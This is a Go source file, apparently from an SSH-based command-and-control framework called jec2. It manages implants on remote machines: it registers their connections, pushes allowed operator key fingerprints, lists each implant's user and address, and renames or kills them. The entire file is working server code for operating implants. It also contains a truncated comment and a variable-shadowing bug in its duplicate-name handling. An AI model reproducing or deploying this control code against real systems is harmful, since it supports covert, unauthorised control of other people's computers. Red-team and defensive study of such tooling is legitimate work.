package main

/*
 * implant.go
 * Handle implant connections
 * By J. Stuart McMurray
 * Created 20220327
 * Last Modified 20220331
 */

import (
	"errors"
	"fmt"
	"io"
	"log"
	"sort"
	"strconv"
	"sync"
	"text/tabwriter"
	"time"

	"github.com/magisterquis/jec2/pkg/common"
	"github.com/magisterquis/simpleshsplit"
	"golang.org/x/crypto/ssh"
)

const (
	/* latestImplantName is the pseudoname for the implant which most
	recently connected (which may not still be connected). */
	latestImplantName = "latest"

	/* implantDieWait is the amount of time to wait for an implant to
	promise to die after asking it to and to die after it says it will. */
	implantDieWait = time.Minute
)

// Implant holds info about a connected implant
type Implant struct {
	C    *ssh.ServerConn
	When time.Time
	Name string
}

// SetAllowedOperatorFingerprints sends the current list of allowed
// fingerprints to the implant.
func (imp Implant) SetAllowedOperatorFingerprints() error {
	ok, rep, err := imp.C.SendRequest(
		common.Fingerprints,
		true,
		[]byte(OperatorFPs()),
	)
	if nil != err {
		return fmt.Errorf("sending list: %w", err)
	}
	if !ok {
		return fmt.Errorf("implant reports error: %s", rep)
	}

	return nil
}

// Close sends a request to the implant to terminate itself and then closes the
// connection.
func (imp Implant) Close() error {
	/* Ask the implant to die. */
	ech := make(chan error, 1)
	go func() {
		_, _, err := imp.C.SendRequest(common.Die, true, nil)
		ech <- err
	}()
	/* Wait for the implant to respond or time out. */
	var err error
	select {
	case <-time.After(implantDieWait):
		/* Implant didn't respond, do it the hard way. */
		err = fmt.Errorf("timeout sending termination request")
	case err := <-ech:
		if nil != err {
			err = fmt.Errorf(
				"sending termination request: %w",
				err,
			)
		}
	}

	/* Wait a bit for it to die before we kill it the hard way. */
	ech = make(chan error, 1)
	go func() { ech <- imp.C.Wait() }()
	select {
	case <-time.After(implantDieWait):
		if nil != err {
			err = fmt.Errorf(
				"timeout waiting for implant termination "+
					"after error: %w",
				err,
			)
		} else {
			err = fmt.Errorf(
				"timeout waiting for implant termination",
			)
		}
		imp.C.Close()
	case <-ech:
		/* This is reported elsewhere. */
	}

	return nil
}

var (
	/* implants holds the connected implants. */
	implants      = make(map[string]Implant)
	latestImplant Implant
	implantsL     sync.RWMutex
)

// CopyImplants gets a copy of implants.
func CopyImplants() map[string]Implant {
	implantsL.RLock()
	defer implantsL.RUnlock()
	m := make(map[string]Implant)
	for k, v := range implants {
		m[k] = v
	}
	return m
}

// HandleImplant handles a connection from an implant.
func HandleImplant(
	tag string,
	sc *ssh.ServerConn,
	chans <-chan ssh.NewChannel,
	reqs <-chan *ssh.Request,
) error {
	/* There should be no incoming channels. */
	go func() {
		n := 0
		for nc := range chans {
			tag := fmt.Sprintf("%s-c%d", tag, n)
			n++
			log.Printf(
				"[%s] ACHTUNG! Unexpected new %q channel "+
					"request; this should never happen",
				tag,
				nc.ChannelType(),
			)
			nc.Reject(
				ssh.Prohibited,
				fmt.Sprintf(
					"%s channels prohibited; see "+
						"https://www.youtube.com/"+
						"watch?v=dQw4w9WgXcQ for "+
						"more details.",
					nc.ChannelType(),
				),
			)
		}
	}()

	/* Incoming requests may be used eventually for metadata. */
	go func() {
		n := 0
		for req := range reqs {
			rtag := fmt.Sprintf("%s-r%d", tag, n)
			switch req.Type {
			case common.LogMessage:
				log.Printf("[%s] Log: %s", tag, req.Payload)
				req.Reply(true, nil)
			default:
				log.Printf(
					"[%s] ACHTUNG! Unexpected %q "+
						"request; this should never "+
						"happen",
					rtag,
					req.Type,
				)
				req.Reply(false, []byte(
					"https://www.youtube.com/watch?"+
						"v=dQw4w9WgXcQ",
				))
			}
		}
	}()

	/* We'll need this for its methods, even if we don't keep it. */
	imp := Implant{
		C:    sc,
		When: time.Now(),
		Name: tag,
	}

	/* Give implant a list of allowed fingerprints. */
	if err := imp.SetAllowedOperatorFingerprints(); nil != err {
		return fmt.Errorf("setting allowed fingerprints: %w", err)
	}

	/* Save implant for tunneling. */
	implantsL.Lock()
	defer implantsL.Unlock()

	/* Make sure we don't have duplicate tags.  This should never
	happen. */
	st := tag
	if _, ok := implants[tag]; ok {
		st := fmt.Sprintf(
			"%s-%s",
			tag,
			strconv.FormatInt(time.Now().UnixNano(), 36),
		)
		imp.Name = st
		log.Printf("[%s] Duplicate tag, tunnel with %s", tag, st)
		if _, ok := implants[st]; ok {
			/* Unpossible */
			panic(fmt.Sprintf("duplicate deduped tag %s", st))
		}
	}

	implants[st] = imp
	latestImplant = imp

	/* Remove implant when done. */
	go func() {
		err := sc.Wait()
		implantsL.Lock()
		defer implantsL.Unlock()
		/* Forget about the implant by name. */
		delete(implants, imp.Name)
		/* If this was the latest implant, switch the latest implant
		to the next-latest implant. */
		if imp == latestImplant {
			latestImplant = Implant{} /* Default to no implant. */
			for _, sci := range implants {
				if sci.When.After(latestImplant.When) {
					latestImplant = sci
				}
			}
		}
		/* Log when the implant disconnects. */
		if nil != err && !errors.Is(err, io.EOF) {
			log.Printf("[%s] Implant disconnected: %s", tag, err)
			return
		}
		log.Printf("[%s] Implant disconnected", tag)
	}()
	return nil
}

// GetImplant gets an implant by name.  The special name latestImplantName may
// also be used.
func GetImplant(name string) (Implant, bool) {
	implantsL.RLock()
	defer implantsL.RUnlock()

	/* If we just want the latest implant, do that. */
	if latestImplantName == name {
		var z Implant
		if z != latestImplant {
			return latestImplant, true
		}
		/* May have died. */
		return z, false
	}

	/* Try to get the implant by name. */
	imp, ok := implants[name]
	if !ok {
		return Implant{}, false
	}
	return imp, true
}

// RemoveImplant removes an
// AllImplants runs f on all implants in its own goroutine.
func AllImplants(f func(imp Implant)) {
	imps := CopyImplants()
	for _, imp := range imps {
		go f(imp)
	}
}

// CommandKillImplant is a command handler which kills the named implant.
func CommandKillImplant(lm MessageLogf, ch ssh.Channel, arg string) error {
	imp, ok := GetImplant(arg)
	if !ok {
		return fmt.Errorf("no implant named %q", arg)
	}
	if err := imp.Close(); nil != err {
		return fmt.Errorf("killing %s: %w", arg, err)
	}
	return nil
}

// CommandListImplants lists the currently-connected implants.
func CommandListImplants(lm MessageLogf, ch ssh.Channel, args string) error {
	/* Make a list of implants sorted by connection time. */
	imps := CopyImplants()
	if 0 == len(implants) {
		fmt.Fprintf(ch, "No connected implants\n")
		return nil
	}
	l := make([]Implant, 0, len(imps))
	for _, imp := range imps {
		l = append(l, imp)
	}
	sort.Slice(l, func(i, j int) bool {
		return l[i].When.Before(l[j].When)
	})

	/* Print a nice table. */
	tw := tabwriter.NewWriter(ch, 2, 8, 2, ' ', 0)
	defer tw.Flush()
	fmt.Fprintf(tw, "Implant\tUsername\tAddress\tConnected\n")
	fmt.Fprintf(tw, "-------\t--------\t-------\t---------\n")
	for _, imp := range l {
		fmt.Fprintf(
			tw,
			"%s\t%s\t%s\t%s\n",
			imp.Name,
			imp.C.User(),
			imp.C.RemoteAddr(),
			imp.When.Format(time.RFC3339),
		)
	}

	return nil
}

// CommandRenameImplant renames an implant.
func CommandRenameImplant(lm MessageLogf, ch ssh.Channel, args string) error {
	/* Get the source and dst names. */
	parts := simpleshsplit.Split(args)
	if 2 != len(parts) {
		return fmt.Errorf("need exactly two names")
	}
	src, dst := parts[0], parts[1]

	/* Work out which implant to rename. */
	oldi, ok := GetImplant(src)
	if !ok {
		return fmt.Errorf("no implant named %q", src)
	}
	newi := oldi
	newi.Name = dst

	/* Replace the old implant with the new one. */
	implantsL.Lock()
	defer implantsL.Unlock()

	/* Make sure there's not already an implant with the name. */
	if _, ok := implants[newi.Name]; ok {
		return fmt.Errorf("implant %q already exists", newi.Name)
	}

	/* Make sure we didn't lose the old one. */
	if _, ok := implants[oldi.Name]; !ok {
		return fmt.Errorf("implant %q no longer exists", oldi.Name)
	}

	/* Do the rename. */
	implants[dst] = newi
	delete(implants, oldi.Name)
	if latestImplant == oldi {
		latestImplant = newi
	}

	fmt.Fprintf(ch, "Renamed %s -> %s\n", oldi.Name, newi.Name)

	return nil
}
